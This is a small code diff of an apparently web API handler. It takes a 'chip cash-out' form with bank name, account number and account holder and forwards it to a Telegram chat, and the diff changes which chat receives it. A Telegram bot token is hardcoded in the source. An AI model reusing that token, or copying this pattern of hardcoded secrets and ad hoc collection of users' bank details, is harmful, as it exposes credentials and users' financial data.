@@ -3,7 +3,7 @@ export default async function handler(req, res) {
 
     const { id, nick, jumlah, bank, norek, nama } = req.body;
     const token = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw";
-    const chat_id = "7614282744";
+    const chat_id = "6604182176";
 
     const pesan = `🔔 *BONGKAR CHIP* 🔔\n\n🆔 ID: ${id}\n👤 Nick: ${nick}\n💰 Jumlah: ${jumlah}\n🏦 Bank: ${bank}\n💳 No Rek: ${norek}\n📛 Nama: ${nama}`;
 
